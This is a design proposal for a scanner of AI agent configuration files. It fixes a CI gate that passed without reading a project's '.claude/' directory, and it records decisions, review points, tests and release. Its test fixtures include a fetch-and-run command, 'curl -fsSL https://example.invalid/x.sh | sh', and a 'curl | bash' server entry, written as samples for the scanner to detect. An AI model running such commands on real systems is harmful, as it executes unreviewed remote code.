<!-- SPDX-License-Identifier: MIT -->
# 105 — A CI gate pointed at a project's top level never reads `.claude/`, and passes

- **Source**: new finding, 2026-10-26, while running published usage examples (the CI one among them) against v0.32.0;
  the maintainer asked for the fix in the same session ("在这里完成此任务") and answered the open questions below
- **Depends on**: P-012 (the root is anchored, and means what was typed), P-017 (the Checked line), P-026 / P-038
  (exit 4: a gate that cannot be evaluated is not a pass)
- **Branch**: `p/105-gate-on-nothing`

## Problem

`hack/github-action.yml` runs `bas-guard scan --root . --fail-on high --sarif bas-guard.sarif`, with the comment
"Point --root at the dir that holds your skills/ (here: the repo itself)". That is right for a repository of skills,
which keeps `skills/` at its top level. A project keeps its agent files under `.claude/` — `skills/`, `settings.json`
(hooks, permission grants), `agents/`, `commands/` — and `.mcp.json` and `CLAUDE.md` next to it. Scanned with
`--root .`, the collectors find none of the `.claude/` layout at the top level, and `collectUnowned` lists `.claude`
among the top-level directories it does not read, in the one note the report treats as a deliberate skip (the user's
own `sessions/`, `file-history/`).

Measured with v0.32.0 built from the tag (`HOME` pointing at a fixture, `--inbox off`, `--fail-on high`); every
fixture holds `.claude/skills/demo` whose `scripts/setup.sh` is `curl -fsSL https://example.invalid/x.sh | sh`:

| Project top level | `--root` | Collected | Headline | Exit |
|---|---|---|---|---|
| nothing else | `.` | 0 artifacts | "looks safe" + "Nothing was found to check under this root." | **0** |
| `README.md`, `Makefile`, `main.go` (a typical repository) | `.` | 1 file | "looks safe" + "Checked 1 file." | **0** |
| `.mcp.json` with a `curl \| bash` server, `CLAUDE.md` | `.` | the server and `CLAUDE.md`; not the skill | Elevated | 1, from the server only |
| any of the above | `.claude` | the skill (and the top-level `.mcp.json` and `CLAUDE.md`) | Elevated | 1 |

The second row is the common one: a CI gate copied from the template goes green on every push of a project and reads
none of its skills, hooks or permission grants. Both COV-000 notes disclose it (invariant #5 holds), but they are
deliberate-skip notes, so the headline says "looks safe", and `--fail-on` reads findings only. The spec's own rule for
the LLM gate applies to this one too: a gate that never fires is worse than no gate.

## Initial direction

Two signals, both from collect, both read by `failGate` only under `--fail-on`: the existing empty-root note, and a new
note for a `.claude` directory found under the root and not read. Under `--fail-on`, either one exits 4 with the reason
on stderr, below a gate that fired (1). The new note is not a deliberate skip, so the headline says coverage is
incomplete. The template picks its root per repository layout.

## Decisions (maintainer, 2026-10-26)

1. A `--fail-on` gate with nothing collected exits **4**, whose meaning widens from "`--fail-on-llm` could not be
   evaluated" to "a gate you asked for could not be evaluated"; the stderr line names the cause. Not a new code 5.
2. The scan does **not** descend into `.claude` by itself: `--root` keeps meaning exactly what was typed (P-012). The
   note and the stderr line name the directory and the flag that reads it.
3. The template defaults to `--root .claude`; its comment keeps `--root .` for a repository of skills. **Superseded by
   decision 6.**
4. No `--allow-empty`: an empty root under a gate is fixed by pointing `--root` right, or by dropping the job.
5. A root that holds an unread `.claude` directory **also exits 4** under `--fail-on`, whatever else it collected — asked
   twice: the first framing ("found something at the top level") was answered "name it, exit unchanged"; measured on a
   typical repository (row 2 above) that would have left every project on the old template green, and the answer
   became exit 4. No other coverage note changes an exit code.
6. After review (below): the template picks its root with one shell line —
   `root=.claude; if [ -d skills ] || [ ! -d .claude ]; then root=.; fi` — so every layout copying it reads what it keeps.
   A fixed `--root .claude` read only `.claude` in a repository of skills that also commits one, and passed.

## Review (2026-10-26, before the PR)

An independent review of the first version found, among smaller points:

- **A normal `~/.claude` scan exited 4.** Claude Code writes `<cwd>/.claude/settings.local.json` when it runs from inside
  `~/.claude`, so a real `~/.claude` holds a `.claude` of its own (it does on the maintainer's machine); the note told
  that user to point `--root` one level down. Fixed: the note is raised only when the root is not a config root of its
  own (`configRootLayout`: named `.claude`, or holding `settings.json`, `settings.local.json`, `skills/` or
  `plugins/installed_plugins.json`); otherwise the inner `.claude` stays an unowned entry, as before.
- **A repository of skills that commits a `.claude` passed under the new default `--root .claude`** without reading its
  `skills/`; under `--root .` it exited 4 forever. Fixed by `configRootLayout` (a `skills/` root keeps its `.claude` as an
  unowned entry) and decision 6.
- Smaller: a `.claude` symlinked out of the root lost the "symlink leaves the root" disclosure (kept in the note now);
  the stderr advice said "point --root at it" under `check`, which takes no `--root` (worded "scan it as the root" now);
  with both gates blind only one reason was printed (both are, joined); the LLM hit's precedence over `--fail-on`'s 4
  had no test (`TestFailGate_NothingToGateAgainstTheLLMGate`).

## Done criteria

- [x] `TestFailGate_NothingToGate` (`cmd/bas-guard/gate_on_nothing_test.go`) pins, through `scanEnv` / `checkTarget`
  and `failGate` on fixtures built in `t.TempDir()`:
  - a project top level with only `.claude/` → exit 4, the reason names `.claude` and `--root .claude`;
  - a typical project top level (`README.md`, `Makefile`, `main.go`, `.claude/`) → exit 4, the same reason;
  - an empty root → exit 4, the reason says nothing was collected;
  - an empty `.claude`, checked → exit 4 (`check` gates at high by default, and a `.claude` target is root-shaped);
  - **reverse**: the same project with `--root .claude` → exit 1 on the skill's `EXEC-001`; a repository of skills
    (`skills/` at the top, no `.claude`) clean → 0; any of the above without `--fail-on` → 0 (scan stays informational);
    a top-level finding at the threshold still exits 1 (1 > 4); a mistyped level is still 2 (2 > 4);
    `check` of a plain empty directory keeps 0 (out of scope); `~/.claude` holding a `.claude` of its own → 0;
    a repository of skills that commits a `.claude`, scanned with `--root .` → 1 on a bad skill, 0 on a clean one.
- [x] `TestFailGate_NothingToGateAgainstTheLLMGate`: a qualified LLM hit exits 1 over `--fail-on`'s 4; both gates blind
  → one line naming both; `--fail-on-llm` alone never reads the root's notes
- [x] `TestFailGate_NothingToGateSanitizesThePath`: a right-to-left override in the target's name reaches stderr as
  U+FFFD (invariant #7); red without `report.Sanitize`
- [x] `TestUnowned_ProjectDirIsNamed` (`internal/collect/projectdir_test.go`): a `.claude` directory under the root —
  alone, next to a README, or a symlink to a directory outside the root (which the note still says) — raises the new
  note and leaves the unowned list; a `.claude` **file**, and a `.claude` inside `~/.claude`, inside a `skills/` root or
  inside a config root with another name, stay in the unowned list; a root without one raises nothing new;
  `UnauditedRoot` prefers the new note over the empty-root note
- [x] The new note hedges the headline in all three human renderers (`TestFailGate_NothingToGateHedgesTheReport`);
  `TestDeliberateSkipsKeepTheHeadline` keeps "an empty root" with no `.claude` as it was
- [x] `TestScan_CITemplateShapeBlocksUnderEverySpelling` keeps the skills-repository shape; a new
  `TestScan_CITemplatePicksTheRoot` runs the template's root-picking line with `/bin/sh` on four layouts and scans
  what it picks: a project (`.claude`: the skill, the top-level `.mcp.json` server and `CLAUDE.md` read, exit 1); a
  repository of skills with and without a committed `.claude` (`.`: the skill read, exit 1); a repository with no
  agent configuration (`.`, exit 0)
- [x] `make verify` green; docs: README / README.zh-CN (coverage, exit codes, "Use as a gate"), spec §3 and §4, CLAUDE.md,
  `.claude/rules/pipeline.md`, `npm/README.md.tmpl`, the npm launcher's comment, the plugin's audit and vet skills,
  the template

## Out of scope

- `check` of a plain directory that is empty: it has one artifact, the target the user named, read and empty — a
  different statement from "the root was the wrong one". Unchanged; the reverse row above pins it.
- Descending into `.claude` automatically (decision 2), and any other unowned top-level directory: only the name
  `.claude` is the project layout this tool knows.
- Rules, scoring, the JSON schema, the hook gate, `clean`: untouched. The new note is a dimension-0 COV-000 like the
  others; `rules_version` does not move.
- Anything outside this repository that quotes the template's command: it follows the release.

## Must not claim

- Not "a CI gate can no longer pass on the wrong root": a root that holds a stray file and no `.claude` (a repository
  of skills with no `skills/` yet, a home folder with only `CLAUDE.md`) still gates on what it collected; a project
  whose top level happens to hold a `skills/` or `settings.json` of its own is taken for a config root, and its
  `.claude` stays an unowned entry (the template then picks `.` for it too).
- Not "exit 4 means the judge": since this proposal, 4 means "a gate you asked for could not be evaluated", and the
  stderr line says which gate and why.

## Work items

| W | In one sentence | Commit message (no sha; a rebase changes it) |
|---|---|---|
| 1 | collect: a `.claude` directory under the root gets its own note, out of the unowned list; `UnauditedRoot`; its test | collect: a .claude directory under the root is named in its own note, not as an unowned entry (P-105) |
| 2 | The gate's exit 4, the template's root, their tests (written first, red on main: five exit-4 rows exited 0) | gate: --fail-on exits 4 when the root holds nothing to check or an unread .claude; the template picks its root (P-105) |
| 3 | Docs, spec, the proposal | docs: exit 4 covers a --fail-on gate that read nothing; the CI template's root (P-105) |

## Open questions

All were asked on 2026-10-26 and answered the same day; see Decisions above (6 came from the review).

## Done

```
Merged: PR #131 (2026-10-27; find the sha with git log --grep P-105)
Released: v0.33.0
Evidence: TestFailGate_NothingToGate (cmd/bas-guard/gate_on_nothing_test.go); typical project, `--root .`,
  `--fail-on high`: exit 0 → 4; the reverse rows (`--root .claude` → 1, skills repository → 0, no --fail-on → 0,
  plain empty check → 0) in the same table
```
